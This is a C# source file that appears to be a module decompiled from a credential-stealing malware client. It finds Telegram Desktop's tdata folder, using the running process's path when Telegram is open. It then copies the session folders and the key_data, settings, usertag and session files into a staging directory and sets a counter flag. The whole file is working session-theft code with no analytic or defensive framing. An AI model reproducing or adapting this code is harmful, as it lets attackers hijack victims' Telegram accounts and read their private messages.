using System;
using System.Diagnostics;
using System.IO;
using Client.Modules.Manager;
using Client.Modules.Passwords.Helpers;
using Client.Modules.Passwords.Targets.System;

namespace Client.Modules.Passwords.Targets.Messengers;

internal sealed class Telegram
{
	private static string GetTdata()
	{
		string result = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata";
		Process[] processesByName = Process.GetProcessesByName("Telegram");
		if (processesByName.Length == 0)
		{
			return result;
		}
		return Path.Combine(Path.GetDirectoryName(ProcessList.ProcessExecutablePath(processesByName[0])), "tdata");
	}

	public static bool GetTelegramSessions(string sSaveDir)
	{
		string tdata = GetTdata();
		try
		{
			if (!Directory.Exists(tdata))
			{
				return false;
			}
			Directory.CreateDirectory(sSaveDir);
			string[] directories = Directory.GetDirectories(tdata);
			string[] files = Directory.GetFiles(tdata);
			string[] array = directories;
			foreach (string text in array)
			{
				string name = new DirectoryInfo(text).Name;
				if (name.Length == 16)
				{
					string destFolder = Path.Combine(sSaveDir, name);
					Filemanager.CopyDirectory(text, destFolder);
				}
			}
			array = files;
			for (int i = 0; i < array.Length; i++)
			{
				FileInfo fileInfo = new FileInfo(array[i]);
				string name2 = fileInfo.Name;
				string destFileName = Path.Combine(sSaveDir, name2);
				if (fileInfo.Length <= 5120L)
				{
					if (name2.EndsWith("s") && name2.Length == 17)
					{
						fileInfo.CopyTo(destFileName);
					}
					else if (name2.StartsWith("usertag") || name2.StartsWith("settings") || name2.StartsWith("key_data"))
					{
						fileInfo.CopyTo(destFileName);
					}
				}
			}
			Counter.Telegram = true;
			return true;
		}
		catch
		{
			return false;
		}
	}
}
